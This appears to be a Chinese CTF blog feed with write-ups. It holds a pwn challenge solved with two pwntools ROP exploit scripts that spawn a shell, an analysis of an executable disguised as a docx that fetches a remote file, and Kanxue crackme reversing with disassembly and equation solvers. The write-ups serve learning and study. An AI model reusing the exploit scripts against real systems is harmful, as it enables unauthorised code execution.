0x00007FB8DF0954501) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: 3Enter bytes to send (max 1024): 3asd1) Get libc address2) Get address of a libc function3) Nom nom r0p buffer to stack4) Exit: Bad choice. 功能1，可以获得libc的基址功能2，可以获得函数的地址功能3，输入的地方，感觉这个地方可能存在漏洞。 紧接着，我们可以用IDA 分析程序了。发现一个函数的不适当应用，拷贝的过程中没有判断大小，可能造成缓冲区溢出。 void memcpy(voiddest, const void * src, size_t n);由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。savedregs是一个IDA关键字我们可以看到 保存的堆栈帧指针和函数返回地址：在IDA中，我们可以直接单击它。buf的大小应该是8没错，之后可能造成缓冲区溢出，那么我的解题思路大概是如下：1、找到system的地址2、找到”/bin/sh”地址，找不到就找个bss地址，将”/bin/sh”传入3、找个gadgets像pop rdi,ret完成上面三个步骤，我们就可以去构造我们的ROP链来getshell。 3、找这个ROPgadget安装参考:https://github.com/JonathanSalwan/ROPgadget找到本地的gadgetsROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;|grep rdi1230x000000000002079b : pop rdi ; pop rbp ; ret0x000000000001fc3a : pop rdi ; ret0x0000000000025312 : pop rdi ; ret 0x13 参看目标libc版本：ldd1234linux-vdso.so.1 (0x00007ffecd990000)libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f427bb9d000)libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f427b7fe000)/lib64/ld-linux-x86-64.so.2 (0x0000561313850000) 找到本地的/bin/shstrings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;12root@kali:pwn2# strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh" 161999 /bin/sh 可以知道”/bin/sh”偏移是0x161999至于sytem函数，程序的第二个功能已经给我们了，至此，我们可以开始构造我们的exp了. 4、exp:12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *def get_libc_func_addr(p, function): p.send("2\n") msg = p.recvuntil("Enter symbol: ") p.send(function+"\n") msg = p.recvuntil("4) Exit\n: ") offset = msg.find(":") offset2 = msg.find("\n") addr = msg[offset+2: offset2] return long(addr, 16)def send(p,payload): p.sendline("3") p.recv(1024) p.send("%d\n"%(len(payload)+1)) p.sendline(payload) p.sendline("4") returnp=process("./pwn2") #p=remote("127.0.0.1",4001)so = ELF('/lib/x86_64-linux-gnu/libc.so.6')#so=ELF('libc.so.6')system_addr=get_libc_func_addr(p,"system")print hex(system_addr)system_offset=0x780560system_offset=so.symbols['system']base=system_addr-system_offsetprint hex(base)pop_r_offset=0x1fc3apop_r_addr=base+pop_r_offsetsh_offset=0x161999sh_addr=base+sh_offsetpayload='a'*8+p64(pop_r_addr)+p64(sh_addr)+p64(system_addr)send(p,payload)p.interactive() 这里记录一下我走过的坑，不知道libc.so.6的地址打印出来是干什么的，开始我认为是libc_base,但是它的值比打印出来的system值大，这就很奇怪，因为：system_offset = so.symbols[‘system’]systemAddr - system_offset = libc_basewriteAddr -so.symbols[‘write’] = libc_base 所以不知道它的作用是什么，但这道题，没有给libc.so.6,据说是可以查看版本的，这里我就偷懒的，因为和上一道题是在同一台机器上的，那肯定用同一个libc库了，直接拿来用 2、入群链接：http://pan.baidu.com/s/1qY4wyoW 密码：46d4代码12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *elf=ELF(&apos;pwn&apos;)get_got = elf.got[&apos;fgets&apos;]puts_plt = elf.plt[&apos;puts&apos;]puts_got = elf.got[&apos;puts&apos;]main = elf.symbols[&apos;main&apos;]bss = 0x6020b0ppprdi=0x401ab0 p = process(&apos;pwn&apos;)p.recvuntil(&apos;&gt; &apos;)#gdb.attach(p,&apos;&apos;&apos;b *0x4019ea &apos;&apos;&apos;)def peek(addr): rop = p64(ppprdi) +p64(addr) +p64(1)+p64(1) + p64(puts_plt) + p64(main) p.sendline(&apos;A&apos;*40+ rop) str = p.recvuntil(&apos;&gt; &apos;) result = str.split(&apos;\ncallme&apos;)[0] if result == &apos;&apos;: return &apos;\x00&apos; return resultd = DynELF(peek, elf=elf)system = int(d.lookup(&apos;system&apos;, &apos;libc&apos;))gets = int(d.lookup(&apos;gets&apos;, &apos;libc&apos;))rop = p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(gets) + p64(main)payload = &quot;A&quot;*40 + ropp.sendline(payload)p.sendline(&apos;/bin/sh\0&apos;)p.recvuntil(&apos;&gt; &apos;)rop=p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(system) + p64(0xdeadbeef)payload = &quot;A&quot;*40+ ropp.sendline(payload)p.interactive() 之后是什么、、、、说好的flag呢？哇还有东西，居然还有都行，居然是.dat文件 害怕-恐怖 才想到做题技术大牛说的，不要害怕新的挑战，敢于尝试， 然后，研究几分钟，发现就很简单算法 这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心Do_more_and_ask_less]]></content>
      <categories>
        <category>pwn</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE_病毒分析]]></title>
    <url>%2F2017%2F11%2F01%2Fre_doxc_exe%2F</url>
    <content type="text"><![CDATA[EXE文件伪装成docx，初次见到蒙 1、题目链接：http://pan.baidu.com/s/1qX8PHnA 密码：34yi 2、查看文件ida打开exe发现加壳程序,pedi没有检查倒是什么壳，放到kali用strings一下尝试upx脱壳机脱，然而脱不下来,手动脱了,UPX的脱壳比较简单，找到pushad 和popad下断点，然后往下跟就好，找到的OEPOEP开始一般都这样的右键使用OllyDump将程序dump出来即可，UPX加壳的程序不需要修复IAT就可以直接运行用ida打开,已经可以看见代码啦sub_401370函数的逻辑如下，主要行为为拷贝evil.exe到%temp%下一份，在从资源中释放evil.docx文件到当前目录 sub_401620的功能很简单，就是如果命令行参数个数为2（即之前新创建的进程），则循环删除evil.exe文件创建一个进程evil.exe “evil.exe”，然后打开docxsub_4018F0从http://www.ddctf.com/x.jpg中读取数据。x.jpg即题目中的x.jpg，自建服务器然后将x.jpg放在之后是两个解码函数，这里可以直接忽略其中的逻辑。然后是执行sub_401220的函数,OD动态跟一下看 3、搭建环境我们用IIS在本地搭建web服务，使得程序能访问 http://www.ddctf.com/x.jpg。 3、OD动态0x402476（main）]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE——看雪]]></title>
    <url>%2F2017%2F10%2F28%2Fre_kx1%2F</url>
    <content type="text"><![CDATA[去膜拜看雪师傅啦,看雪论坛是个软件安全技术交流场所，为安全技术爱好者提供一个技术交流平台和资源。从单一版块『软件调试论坛』，发展到以软件安全技术为主题多个版块的综合论坛。其实这是一个超级大神级别的存在，来膜拜一波 Re1签到题直接过 Re21、题目链接：http://pan.baidu.com/s/1qXVQmok 密码：h5sw去年你已经知道看雪啦，只是不敢去做题，自己太菜了，今年去试一试，第一道题签到题，很开心。然而，第二题，我已经跪啦，不过，在公布wp后，还是学到了许多，这里记录一下学习到的知识。 2、分析一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，有明确提示成功和失败信息。二、入坑：OD加载，查找字符，定位到：“You get it!”123456789101112131415161718192021222324252627282930313233343536地址 反汇编 文本字符串00401000 /$ 68 6CB04100 PUSH ctf2017_.0041B06C ; \n Crackme for CTF2017 @Pediy.\n00401005 |. E8 382D0100 CALL ctf2017_.00413D420040100A |. 83C4 04 ADD ESP,0x40040100D |. C705 34B04100&gt;MOV DWORD PTR DS:[0x41B034],0x2 ; 200401017 |. E8 34000000 CALL ctf2017_.00401050 ; input0040101C |. E8 6F000000 CALL ctf2017_.00401090 ; check100401021 |. E8 BA000000 CALL ctf2017_.004010E0 ; check200401026 |. A1 34B04100 MOV EAX,DWORD PTR DS:[0x41B034] ; 00040102B |. 85C0 TEST EAX,EAX0040102D |. 75 10 JNZ Xctf2017_.0040103F0040102F |. 68 5CB04100 PUSH ctf2017_.0041B05C ; You get it!\n00401034 |. E8 092D0100 CALL ctf2017_.00413D4200401039 |. 83C4 04 ADD ESP,0x40040103C |. 33C0 XOR EAX,EAX0040103E |. C3 RETN0040103F |&gt; 68 38B04100 PUSH ctf2017_.0041B038 ; Bad register-code, keep trying.\n00401044 |. E8 F92C0100 CALL ctf2017_.00413D4200401049 |. 83C4 04 ADD ESP,0x40040104C |. 33C0 XOR EAX,EAX0040104E \. C3 RETN0040104F 90 NOP00401050 /$ 83EC 0C SUB ESP,0xC00401053 |. 68 ACB04100 PUSH ctf2017_.0041B0AC ; Coded by Fpc.\n\n00401058 |. E8 E52C0100 CALL ctf2017_.00413D420040105D |. 83C4 04 ADD ESP,0x400401060 |. 68 90B04100 PUSH ctf2017_.0041B090 ; Please input your code:00401065 |. E8 D82C0100 CALL ctf2017_.00413D420040106A |. 83C4 04 ADD ESP,0x40040106D |. 8D4424 00 LEA EAX,DWORD PTR SS:[ESP]00401071 |. 50 PUSH EAX00401072 |. 68 8CB04100 PUSH ctf2017_.0041B08C ; %s00401077 |. E8 F72C0100 CALL ctf2017_.00413D730040107C |. 8D4424 08 LEA EAX,DWORD PTR SS:[ESP+0x8]00401080 |. 83C4 14 ADD ESP,0x1400401083 \. C3 RETN 简单跟踪几步发现 401090、4010E0 为显性算法比较，分析 401090、4010E0：12345678910111213141516void check1()&#123; int v0; // [sp+4h] [bp-8h]@0 int v1; // [sp+8h] [bp-4h]@0 if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 5 * (v1 - v0) + v1 == 0x8F503A42 &amp;&amp; 13 * (v1 - v0) + v0 == 0xEF503A42 ) --dword_41B034;&#125;void check2()&#123; int v0; // [sp+4h] [bp-8h]@0 int v1; // [sp+8h] [bp-4h]@0 if ( v1 &amp;&amp; v0 &amp;&amp; v1 != v0 &amp;&amp; 17 * (v1 - v0) + v1 == 0xF3A94883 &amp;&amp; 7 * (v1 - v0) + v0 == 0x33A94883 ) --dword_41B034;&#125; 把输入每4个字符ASCII作为十六进制赋值计算，假设为a,b则： ⑴：0x5 ( a - b ) + a == 0x8F503A42 ⑵：0xD ( a - b ) + b == 0xEF503A42 ⑶：0x11 ( a - b ) + a == 0xF3A94883 ⑷：0x7 ( a - b ) + b == 0x33A94883然而我分析到这里，感觉只能穷举。。。。结果当然失败了后来看了大佬们的wp，果然学到了许多大佬1：考虑该显性算法未随机打乱数值，低位特征依然继承到计算结果，因此先尝试求解低位，再逐个往高位求解，避免穷举范围过大：123456789101112def solve_false(): start_time = time.clock() for a1 in range(0x30,0x7b): for b1 in range(0x30,0x7b): if (0x5 * (a1 - b1) + a1) &amp; 0xff == 0x42: if (0xd * (a1 - b1) + b1) &amp; 0xff == 0x42: if (0x11 *(a1 - b1) + a1) &amp; 0xff == 0x83: if (0x7 * (a1 - b1) + b1) &amp; 0xff == 0x83: print (&quot;found sn a1 : %x&quot; % a1) print (&quot;found sn b1 : %x&quot; % b1) print (&apos;use time: %.3f second&apos; % (time.clock()-start_time)) return 迅速识别该方程组无合法答案，无疑是作者埋的坑，立即寻找其他途径。大佬2:z3识别改方程组无解（这里我还是没有懂，z3太强大啦）大佬3：120x11 * ( a - b ) + a == 0xF3A948830x5 * ( a - b ) + a == 0x8F503A42 推出:12 * ( a - b ) == 0x64590d41右边为偶数，左边为奇数，无解 这道题由于没有判断输入长度，便存在溢出（这里我完全没有想打RE，还有溢出，涨知识了），那溢出到哪里呢？,大佬们发现0x00413131存在shellcode编码（膜拜），溢出到这里123456789101112131415161718192021222324252627282930313233343536.text:0040112B db 5 dup(90h).text:00401130 dd 4800h dup(0).text:00413130 ; ---------------------------------------------------------------------------.text:00413130 retn.text:00413130 ; ---------------------------------------------------------------------------.text:00413131 db 83h, 0C4h, 0F0h.text:00413134 dd 20712A70h, 0F1C75F2h, 28741C71h, 2E0671DDh, 870F574h.text:00413134 dd 74F17169h, 0DC167002h, 0EA74C033h, 0DC261275h, 0F471E771h.text:00413134 dd 6903740Fh, 0EB75EB70h, 0FDF7069h, 22712C70h, 0B8261F7Dh.text:00413134 dd 2B741E71h, 3E067169h, 870F57Ch, 7CF17169h, 0DC197002h.text:00413134 dd 41B034A3h, 75E77400h, 0E571DC12h, 7CDCF271h, 0E9706903h.text:00413134 dd 6965E97Dh, 70B8DC70h, 3E1D7127h, 710F1971h, 0DD257019h.text:00413134 dd 0F6700571h, 71DD0870h, 700270F2h, 70580F14h, 0F1171ECh.text:00413134 dd 0F671EA71h, 0DD03700Fh, 0ED71ED70h, 0FE170DDh, 7F36217Eh.text:00413134 dd 671A7D27h, 1D2A74B8h, 65690D7Eh, 67C067Fh, 1D361C7Eh.text:00413134 dd 8BDC0E7Fh, 75EA74C8h, 7E69DC14h, 0C1F47FEFh, 0F97CFB7Fh.text:00413134 dd 0EA7DE27Fh, 0D87E6965h, 772076B8h, 2E1A7F27h, 0DD2978B8h.text:00413134 dd 778D0D76h, 67EF207h, 0DD261B76h, 58B80E77h, 1479EB78h.text:00413134 dd 768DB865h, 0FF477EFh, 0F97EFB77h, 0EA7FE177h, 0B8D9768Dh.text:00413134 dd 73F22372h, 1C756729h, 0DD2C740Fh, 66690E72h, 6740673h.text:00413134 dd 0DD361E72h, 0DD261073h, 0E974D88Bh, 12751575h, 73ED72DCh.text:00413134 dd 0FB730FF3h, 0E073F974h, 6966E875h, 740FD672h, 2E1D7527h.text:00413134 dd 75DC1973h, 0DD267C19h, 742E0475h, 0F3751D08h, 16740272h.text:00413134 dd 0ED7C58C1h, 0C1F3137Dh, 0F575EA75h, 1D03720Fh, 0EC73EC74h.text:00413134 dd 0DF741D66h, 0F23EBDCh, 0EB227585h, 85261DFAh, 74D08B29h.text:00413134 dd 0EBF6EB18h, 75D08BF4h, 32F2EBECh, 0E9754A3Eh, 6256F2EBh.text:00413134 dd 0EDEB7A6Eh, 7D267C7Ah, 187DF21Ch, 70187D0Fh, 37D1D25h.text:00413134 dd 7D69087Ch, 7C027CF4h, 0C18BDC16h, 1271ED70h, 7DEB7DDCh.text:00413134 dd 37CC1F5h, 7DEC7C69h, 7C6966ECh, 2A780FDFh, 793E2079h.text:00413134 dd 1C79B81Ch, 798D2874h, 0F5783606h, 79DD0878h, 780278F1h.text:00413134 dd 0C32B0F16h, 1275EA74h, 0E7790F2Eh, 78B8F479h, 0EB78DD03h.text:00413134 dd 78DDEB79h, 2B70B8DFh, 79662271h, 1E71C11Eh, 71692A70h.text:00413134 dd 70F67805h, 0F271DD08h, 19700278h, 2E0C10Fh, 1471EA70h.text:00413134 dd 0F107966h, 0F171E571h, 700278DCh, 36E979E9h, 0C1DC70DDh.text:00413134 dd 22712B70h, 0B81E7326h, 29781E71h, 571DD3Eh, 870F572h.text:00413134 dd 72F1711Dh, 0C1177002h, 0EA78C103h, 733E1379h, 0E671C10Fh 那溢出长度是多少呢？输入aaaabbbbccccddddeeee,发现返回地址是dddd,再次输入aaaabbbbccc11A黑色，这里右键-分析-从模块删除分析这里出现花指令(代码混淆，花指令不影响程序运行。就是看耐心。就拿这个题目来说。花指令就是跳来跳去。可以脱去，其实不脱话也一样的)一步一步分析在0x413131位置设置新断点，回车断下，忽略花指令，仅摘录算法相关代码：12345678910111213141516171819202122232425262728293031323334353600413131 83C4 F0 add esp,-0x1000413150 33C0 xor eax,eax00413184 A3 34B04100 mov dword ptr ds:[0x41B034],eax 004131BA 58 pop eax //aaaa004131EB 8BC8 mov ecx,eax0041321F 58 pop eax //bbbb00413254 8BD8 mov ebx,eax00413289 58 pop eax //cccc004132B5 8BD0 mov edx,eax004132AD 8BD0 mov edx,eax004132E2 8BC1 mov eax,ecx //eax=aaaa00413316 2BC3 sub eax,ebx //ebx=bbbb eax=a-b00413349 C1E0 02 shl eax,0x2 //(a-b)*400413380 03C1 add eax,ecx //(a-b)*4+a004133B5 03C2 add eax,edx //(a-b)*4+a+c004133E9 2D E217F9EA sub eax,0xEAF917E2 ///0xEAF917E2==((a-b)*4+a+c)00413B1E 58 pop eax ; ctf2017_.00413E3E00413B4E 35 0E210100 xor eax,0x1210E00413B83 3305 34B04100 xor eax,dword ptr ds:[0x41B034]0040103F 68 38B04100 push ctf2017_.0041B038 &quot;Bad register-code&quot;00413455 03C1 add eax,ecx //ecx=aaaa00413489 2BC3 sub eax,ebx //ebx=bbbb004134BF 8BD8 mov ebx,eax //ebx=eax=a-b004134F3 D1E0 shl eax,1 //(a-b)*200413525 03C3 add eax,ebx //(a-b)*300413559 03C1 add eax,ecx //(a-b)*3+a0041358F 8BC8 mov ecx,eax //004135C3 03C2 add eax,edx //(a-b)*3+a+c004135F7 2D C808F5E8 sub eax,0xE8F508C8 //(a-b)*3+a+c==0xE8F508C800413665 8BC1 mov eax,ecx0041365D 8BC1 mov eax,ecx //(a-b)*3+a004136A7 2BC2 sub eax,edx //(a-b)*3+a-c004136D8 2D 683C0A0C sub eax,0xC0A3C68 // (a-b)*3+a-c==0xC0A3C68 3、求解123(a-b)*3+a-c==0xC0A3C68(a-b)*3+a+c==0xE8F508C8(a-b)*4+a+c==0xEAF917E2 以参考了许多大神的代码学到了一种解决方程的方法，贼好用12345from sympy import *a=Symbol(&apos;a&apos;)b=Symbol(&apos;b&apos;)c=Symbol(&apos;c&apos;)print (solve([(a-b)*3+a-c-0xC0A3C68,(a-b)*3+a+c-0xE8F508C8,(a-b)*4+a+c-0xEAF917E2],[a,b,c])) 3、Re31、题目链接：http://pan.baidu.com/s/1kUYItoz 密码：xem0第三题，我感觉世界观坍塌啦。依然不会，还是学习为主。看大神们的记录，学习一遍 3、分析一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试二、入坑：OD加载（好像我的od直接过了反调试），f9，运行，什么鬼，直接跳到了dll,继续f9….终于出现对话框，输入12345678，结果程序崩溃。 IDA打开，定位到CrackMe字符串，找到关键函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091int __stdcall sub_434EF0(HWND hDlg, int a2, int a3, int a4)&#123; int v4; // ST0C_4@17 CHAR *v5; // esi@17 int v6; // eax@17 int v8; // [sp+0h] [bp-1A4Ch]@18 int v9; // [sp+4h] [bp-1A48h]@18 int v10; // [sp+8h] [bp-1A44h]@18 int v11; // [sp+Ch] [bp-1A40h]@1 int i; // [sp+1C4h] [bp-1888h]@14 char v13[1032]; // [sp+1D0h] [bp-187Ch]@16 char v14[40]; // [sp+5D8h] [bp-1474h]@14 int v15; // [sp+600h] [bp-144Ch]@14 char v16; // [sp+60Ch] [bp-1440h]@14 char v17; // [sp+60Dh] [bp-143Fh]@14 char v18; // [sp+A14h] [bp-1038h]@14 char v19; // [sp+A15h] [bp-1037h]@14 char v20; // [sp+E1Ch] [bp-C30h]@14 char v21; // [sp+E1Dh] [bp-C2Fh]@14 CHAR String; // [sp+1224h] [bp-828h]@14 char v23; // [sp+1225h] [bp-827h]@14 int v24; // [sp+162Ch] [bp-420h]@14 char v25; // [sp+1638h] [bp-414h]@1 char v26; // [sp+1639h] [bp-413h]@1 int v27; // [sp+1A40h] [bp-Ch]@1 unsigned int v28; // [sp+1A48h] [bp-4h]@1 int savedregs; // [sp+1A4Ch] [bp+0h]@1 memset(&amp;v11, 0xCCu, 0x1A40u); v28 = (unsigned int)&amp;savedregs ^ dword_49B344; v27 = 0; v25 = 0; sub_42D5E6(&amp;v26, 0, 1023); v11 = a2; if ( a2 == 16 ) ExitProcess(0); if ( v11 == 272 ) &#123; v27 = sub_42D4F1(); if ( v27 == 1 ) ExitProcess(0); v27 = 0; v27 = sub_42E428(); if ( v27 == 1 ) ExitProcess(0); v27 = 0; v27 = sub_42D825(); if ( v27 == 1 ) ExitProcess(0); sub_42D14F(hDlg, 1); &#125; else if ( v11 == 273 ) &#123; v11 = (unsigned __int16)a3; if ( (unsigned __int16)a3 == 1002 ) &#123; String = 0; sub_42D5E6(&amp;v23, 0, 1023); v20 = 0; sub_42D5E6(&amp;v21, 0, 1023); GetDlgItemTextA(hDlg, 1001, &amp;String, 1025); v24 = sub_42DE51(); v18 = 0; sub_42D5E6(&amp;v19, 0, 1023); sub_42D267(&amp;String, 1024, &amp;v20); v16 = 0; sub_42D5E6(&amp;v17, 0, 1023); sub_42D267(&amp;v20, 1024, &amp;v18); sub_42D96A(&amp;v18, &amp;v16, 1024); v15 = 3; sub_42DA78(&amp;v18, 3, v14); for ( i = 0; i &lt; 32; ++i ) sub_42DF05(&amp;v13[2 * i], &quot;%02x&quot;, v14[i]); v4 = sub_42D794(v13); v5 = &amp;String + sub_42D794(&amp;String); v6 = sub_42D794(v13); if ( !sub_42DB27(v13, &amp;v5[-v6], v4) ) &#123; sub_42D0B4(v8, v9, v10); if ( (unsigned __int8)sub_42D9AB(&amp;unk_49B000, &amp;v16) == 1 ) &#123; MessageBoxA(0, &quot;ok&quot;, &quot;CrackMe&quot;, 0); sub_42DE51(); &#125; &#125; &#125; &#125; sub_42D65E(&amp;savedregs, &amp;dword_435250); sub_42D1E5(); return sub_42DE51();&#125; 哇，还是经验太少，这里许多函数看不懂。 再用OD打开，发现程序有随机化，好烦，f9…出现对话框，按道理这时候可以在读取字符的API下断点，这里是GetDlgItemTextA。然而，我在当前模块中没有找到，后来发现个插件-设置API断点，总算断下来啦。接下来分析算法啦(这是我的能力还是太弱了)。 借助大神们的wpIDA反汇编关键函数 这个直接明文:我自己尝试，然而，我来到这个函数，程序执行后就崩溃了继续分析。 猜测作者意图1、获取输入 ipt2、两次 base64 解码得到 buf3、自定义解码得到 cmd4、判断 sm3(buf[:3) == ipt[-64:]5、cmd 能在迷宫走到终点 4、Re41、题目链接：http://pan.baidu.com/s/1kUYItoz 密码：xem0学习为主。看大神们的记录，学习一遍 3、分析一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试二、OD附加，过反调试先运行exe程序，再打开od附加exe进程，再调用GetWindowTextW的API时候下断点，点击运行，exe程序输入sn,此时会断在od中的GetWindowTextW的断点（还在api系统区）往下走来到程序区往下走,主要细节12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514601151CB0 55 push ebp01151CB1 8BEC mov ebp, esp01151CB3 81EC D0000000 sub esp, 0xD001151CB9 A1 14F01601 mov eax, dword ptr [0x116F014]01151CBE 33C5 xor eax, ebp01151CC0 8945 FC mov dword ptr [ebp-0x4], eax01151CC3 57 push edi01151CC4 8BF9 mov edi, ecx01151CC6 85FF test edi, edi01151CC8 0F84 61010000 je 01151E2F01151CCE 85D2 test edx, edx01151CD0 0F85 81000000 jnz 01151D5701151CD6 E8 25FFFFFF call 01151C00 ;判断注册码是否包含&apos;b&apos;01151CDB 85C0 test eax, eax01151CDD 74 54 je short 01151D3301151CDF 68 C8000000 push 0xC801151CE4 8D85 34FFFFFF lea eax, dword ptr [ebp-0xCC]01151CEA 6A 00 push 0x001151CEC 50 push eax01151CED E8 DE1C0000 call &lt;memset&gt;01151CF2 83C4 0C add esp, 0xC01151CF5 8D85 34FFFFFF lea eax, dword ptr [ebp-0xCC]01151CFB 6A 64 push 0x6401151CFD 50 push eax01151CFE FF77 0C push dword ptr [edi+0xC]01151D01 FF15 4C811601 call dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW01151D07 6A 70 push 0x7001151D09 8D95 34FFFFFF lea edx, dword ptr [ebp-0xCC]01151D0F E8 3C0D0000 call 01152A50 ; 判断注册码里是否包含&apos;p&apos;01151D14 85C0 test eax, eax01151D16 74 1B je short 01151D3301151D18 BA 01000000 mov edx, 0x101151D1D 8BCF mov ecx, edi01151D1F E8 8CFFFFFF call 01151CB001151D24 5F pop edi01151D25 8B4D FC mov ecx, dword ptr [ebp-0x4]01151D28 33CD xor ecx, ebp01151D2A E8 960F0000 call 01152CC501151D2F 8BE5 mov esp, ebp01151D31 5D pop ebp01151D32 C3 retn01151D33 6A 00 push 0x001151D35 68 0F040000 push 0x40F01151D3A 68 11010000 push 0x11101151D3F FF77 04 push dword ptr [edi+0x4]01151D42 FF15 50811601 call dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW01151D48 5F pop edi01151D49 8B4D FC mov ecx, dword ptr [ebp-0x4]01151D4C 33CD xor ecx, ebp01151D4E E8 720F0000 call 01152CC501151D53 8BE5 mov esp, ebp01151D55 5D pop ebp01151D56 C3 retn01151D33 6A 00 push 0x001151D35 68 0F040000 push 0x40F01151D3A 68 11010000 push 0x11101151D3F FF77 04 push dword ptr [edi+0x4]01151D42 FF15 50811601 call dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW01151D48 5F pop edi01151D49 8B4D FC mov ecx, dword ptr [ebp-0x4]01151D4C 33CD xor ecx, ebp01151D4E E8 720F0000 call 01152CC501151D53 8BE5 mov esp, ebp01151D55 5D pop ebp01151D56 C3 retn01151D57 56 push esi01151D58 E8 812B0000 call 011548DE01151D5D 68 C8000000 push 0xC801151D62 8985 30FFFFFF mov dword ptr [ebp-0xD0], eax01151D68 8D85 34FFFFFF lea eax, dword ptr [ebp-0xCC]01151D6E 6A 00 push 0x001151D70 50 push eax01151D71 E8 5A1C0000 call &lt;memset&gt;01151D76 83C4 0C add esp, 0xC01151D79 8D85 34FFFFFF lea eax, dword ptr [ebp-0xCC]01151D7F 68 C8000000 push 0xC801151D84 50 push eax01151D85 FF77 0C push dword ptr [edi+0xC]01151D88 FF15 4C811601 call dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW01151D8E 33F6 xor esi, esi01151D90 8D85 34FFFFFF lea eax, dword ptr [ebp-0xCC]01151D96 66:39B5 34FFFFF&gt;cmp word ptr [ebp-0xCC], si01151D9D 74 0B je short 01151DAA01151D9F 90 nop01151DA0 8D40 02 lea eax, dword ptr [eax+0x2]01151DA3 46 inc esi01151DA4 66:8338 00 cmp word ptr [eax], 0x001151DA8 ^ 75 F6 jnz short 01151DA001151DAA 33C9 xor ecx, ecx01151DAC 8D46 01 lea eax, dword ptr [esi+0x1]01151DAF BA 02000000 mov edx, 0x201151DB4 F7E2 mul edx01151DB6 53 push ebx01151DB7 0F90C1 seto cl01151DBA F7D9 neg ecx01151DBC 0BC8 or ecx, eax01151DBE 51 push ecx01151DBF E8 120F0000 call 01152CD601151DC4 83C4 04 add esp, 0x401151DC7 8BD8 mov ebx, eax01151DC9 E8 102B0000 call 011548DE01151DCE 2B85 30FFFFFF sub eax, dword ptr [ebp-0xD0]01151DD4 83F8 02 cmp eax, 0x201151DD7 7F 65 jg short 01151E3E01151DD9 8D85 34FFFFFF lea eax, dword ptr [ebp-0xCC]01151DDF 50 push eax01151DE0 53 push ebx01151DE1 E8 8A0A0000 call 0115287001151DE6 83FE 07 cmp esi, 0x7 ;注册码是否为7位01151DE9 73 0B jnb short 01151DF601151DEB 6A 00 push 0x001151DED 6A 00 push 0x001151DEF 68 0E040000 push 0x40E01151DF4 EB 0B jmp short 01151E0101151DF6 76 2C jbe short 01151E2401151DF8 6A 00 push 0x001151DFA 6A 00 push 0x001151DFC 68 0D040000 push 0x40D01151E01 FF77 04 push dword ptr [edi+0x4]01151E04 FF15 50811601 call dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW01151E0A 53 push ebx01151E0B E8 CF0E0000 call 01152CDF01151E10 83C4 04 add esp, 0x401151E13 5B pop ebx01151E14 5E pop esi01151E15 5F pop edi01151E16 8B4D FC mov ecx, dword ptr [ebp-0x4]01151E19 33CD xor ecx, ebp01151E1B E8 A50E0000 call 01152CC501151E20 8BE5 mov esp, ebp01151E22 5D pop ebp01151E23 C3 retn01151E24 8BD3 mov edx, ebx01151E26 8BCF mov ecx, edi01151E28 E8 33FCFFFF call 01151A60 ;这里进入最后的判断01151E2D 5B pop ebx01151E2E 5E pop esi01151E2F 8B4D FC mov ecx, dword ptr [ebp-0x4]01151E32 33CD xor ecx, ebp01151E34 5F pop edi01151E35 E8 8B0E0000 call 01152CC501151E3A 8BE5 mov esp, ebp01151E3C 5D pop ebp01151E3D C3 retn01151E3E 6A 00 push 0x001151E40 E8 6C2D0000 call 01154BB1 以上代码得出注册码必须为7位并且包含字符’b’,’p’再看最后的判断call12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617701151870 55 push ebp01151871 8BEC mov ebp, esp01151873 83EC 54 sub esp, 0x5401151876 A1 14F01601 mov eax, dword ptr [0x116F014]0115187B 33C5 xor eax, ebp0115187D 8945 FC mov dword ptr [ebp-0x4], eax01151880 53 push ebx01151881 56 push esi01151882 57 push edi01151883 6A 36 push 0x3601151885 8D45 B0 lea eax, dword ptr [ebp-0x50]01151888 8BD9 mov ebx, ecx0115188A 6A 00 push 0x00115188C 50 push eax0115188D 8BFA mov edi, edx0115188F 895D AC mov dword ptr [ebp-0x54], ebx01151892 E8 39210000 call &lt;memset&gt;01151897 83C4 0C add esp, 0xC0115189A 8D4D E8 lea ecx, dword ptr [ebp-0x18]0115189D B8 30000000 mov eax, 0x30011518A2 66:8901 mov word ptr [ecx], ax011518A5 8D49 02 lea ecx, dword ptr [ecx+0x2]011518A8 40 inc eax011518A9 83F8 39 cmp eax, 0x39011518AC ^ 7E F4 jle short 011518A2 ; 0-9011518AE B8 61000000 mov eax, 0x61011518B3 8D4D B0 lea ecx, dword ptr [ebp-0x50]011518B6 66:8901 mov word ptr [ecx], ax011518B9 8D49 02 lea ecx, dword ptr 